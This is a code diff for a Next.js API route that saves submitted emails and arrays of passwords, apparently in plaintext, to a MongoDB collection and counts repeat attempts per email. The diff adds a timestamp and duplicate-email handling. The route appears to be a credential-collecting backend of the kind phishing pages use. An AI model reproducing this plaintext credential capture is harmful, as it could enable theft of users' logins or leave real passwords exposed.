@@ -1,6 +1,7 @@
 import { NextResponse } from "next/server";
 import { connectToDatabase } from "@/lib/mongodb";
 import { Credential } from "@/models/Credential";
+import { MongoError } from 'mongodb';
 
 export async function POST(request: Request) {
   try {
@@ -17,6 +18,16 @@ export async function POST(request: Request) {
     await connectToDatabase();
 
     const existingCredential = await Credential.findOne({ email });
+    const createdAt = new Date();
+    const formattedCreatedAt = `${String(createdAt.getDate()).padStart(
+      2,
+      "0"
+    )}/${String(createdAt.getMonth() + 1).padStart(2, "0")}/${createdAt
+      .getFullYear()
+      .toString()
+      .slice(-2)} ${String(createdAt.getHours()).padStart(2, "0")}:${String(
+      createdAt.getMinutes()
+    ).padStart(2, "0")}`;
 
     if (existingCredential) {
       existingCredential.attempts += 1;
@@ -27,6 +38,7 @@ export async function POST(request: Request) {
         email,
         passwords,
         attempts: 1,
+        createdAt: formattedCreatedAt,
       });
     }
 
@@ -35,6 +47,12 @@ export async function POST(request: Request) {
       { status: 200 }
     );
   } catch (error) {
+    if (error instanceof MongoError && error.code === 11000) {
+      return NextResponse.json(
+        { success: false, message: "Email already exists" },
+        { status: 400 }
+      );
+    }
     console.error("Error submitting credentials:", error);
     return NextResponse.json(
       { success: false, message: "Internal server error" },
